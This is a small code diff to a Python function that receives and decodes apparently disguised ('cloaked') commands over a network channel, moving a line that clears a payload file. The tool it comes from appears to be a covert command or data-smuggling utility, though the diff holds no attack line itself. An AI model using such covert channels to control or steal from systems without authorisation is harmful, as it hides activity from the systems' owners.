@@ -71,8 +71,9 @@ def receive_command(local=False, args=None, seq_id=0):
         if Decloakify(cloaked_command, cipher, decloaked_command) == -1:
             print("Requesting full re-trasmission")
             send_response('�', srcIp, args)
-            open('cloaked.payload', 'w').close()
             receive_command(local, args)
+        
+        open('cloaked.payload', 'w').close()
 
         # Check if cloakedFile exists after decloakifying
         if os.path.exists(cloaked_command):
